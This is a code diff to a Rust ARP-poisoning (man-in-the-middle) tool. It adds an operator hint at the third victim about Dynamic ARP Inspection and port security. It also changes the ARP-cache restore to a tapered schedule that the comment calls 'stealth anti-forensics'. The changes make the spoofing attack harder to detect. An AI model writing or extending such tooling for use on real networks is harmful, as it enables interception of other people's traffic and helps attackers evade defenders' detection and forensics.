@@ -151,7 +151,12 @@ impl PoisonLoop {
                         victim_count += 1;
                         next_victim = now + jitter(VICTIM_INTERVAL_MS);
 
-                        if victim_count % 5 == 0 {
+                        if victim_count == 3 {
+                            println!(
+                                "{}",
+                                paint!(INFO, "[*] note: if host {} does not route through us, network may have Dynamic ARP Inspection (DAI) or port security enabled.", target.victim_ip)
+                            );
+                        } else if victim_count % 5 == 0 {
                             println!(
                                 "{}",
                                 paint!(INFO, "[*] poison victim #{} host {} (every ~{}s)", victim_count, target.victim_ip, VICTIM_INTERVAL_MS / 1_000)
@@ -226,9 +231,9 @@ fn send_once(sender: &mut dyn DataLinkSender, bytes: &[u8], label: &str) {
     }
 }
 
-/// Sends 5 ARP restore packets to unwind the poison on both sides.
+/// Sends gradual ARP restore packets to unwind the poison on both sides over increasing intervals (stealth anti-forensics).
 fn restore(sender: &mut dyn DataLinkSender, target: &super::SpoofTarget) {
-    println!("{}", paint!(INFO, "[*] restoring ARP caches for {}", target.victim_ip));
+    println!("{}", paint!(INFO, "[*] gradually restoring ARP caches for {} (stealth taper)", target.victim_ip));
 
     let victim_restore = ArpRestore::new(
         target.victim_mac,
@@ -243,13 +248,15 @@ fn restore(sender: &mut dyn DataLinkSender, target: &super::SpoofTarget) {
         target.victim_mac,
     );
 
-    for _ in 0..5 {
+    // Gradual taper over increasing intervals instead of 5 rapid packets
+    let intervals = [100, 200, 500, 1000, 2000, 3000, 5000];
+    for &delay_ms in &intervals {
         send_once(sender, &victim_restore.to_bytes(), "restore victim");
         send_once(sender, &gateway_restore.to_bytes(), "restore gateway");
-        std::thread::sleep(Duration::from_millis(100));
+        std::thread::sleep(Duration::from_millis(delay_ms));
     }
 
-    println!("{}", paint!(OK, "[+] ARP caches restored for {}", target.victim_ip));
+    println!("{}", paint!(OK, "[+] ARP caches fully restored for {}", target.victim_ip));
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
